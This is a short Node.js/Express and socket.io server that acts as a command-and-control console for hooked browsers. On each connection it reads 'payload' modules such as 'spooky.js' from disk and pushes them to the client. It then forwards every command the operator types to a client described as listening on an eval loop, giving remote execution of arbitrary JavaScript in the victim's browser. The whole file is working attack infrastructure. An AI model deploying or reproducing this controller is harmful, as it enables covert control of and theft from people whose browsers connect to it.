var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var readline = require('readline');
var fs = require('fs');

modules = ['spooky.js'] // list of external modules to load when the listener first connects
var modules_root = "modules/";

rl = readline.createInterface(process.stdin, process.stdout);

app.get('/', function(req, res){
  res.sendFile(__dirname + '/index.html');
});
    
io.on('connection', function(socket){
    console.log('[#] User connected: ...');
    console.log("[#] Loading auxillary modules..");
    
    var modules_concat = "";
    // "webpacking" all external payloads 
    modules.forEach((module) => {
        modules_concat += fs.readFileSync(modules_root + module, 'utf-8');
    })
    console.log(modules_concat);
    socket.emit("cmd", modules_concat);

    rl.setPrompt('[#] ');
    rl.prompt();
    
    process.stdout.write("Ready to receive commands");
    // when a cmd is entered on the command line
    rl.on('line', function(cmd) {
        // socket will push cmd to client listening on an eval loop
        socket.emit("cmd", cmd);
        rl.prompt();
    }).on('close', function() {
        console.log('Have a great day!');
        process.exit(0);
    });
   
    // on receiving output from client and write to stdin
    // socket.on("output", function(output){
    //     rl.setPrompt("");
    //     process.stdout.write(output);
    //     process.stdout.write("\n[#] ");
    //     rl.setPrompt("[#] ");
    // });
});

http.listen(3000, function(){
    console.log('listening on *:3000');
});
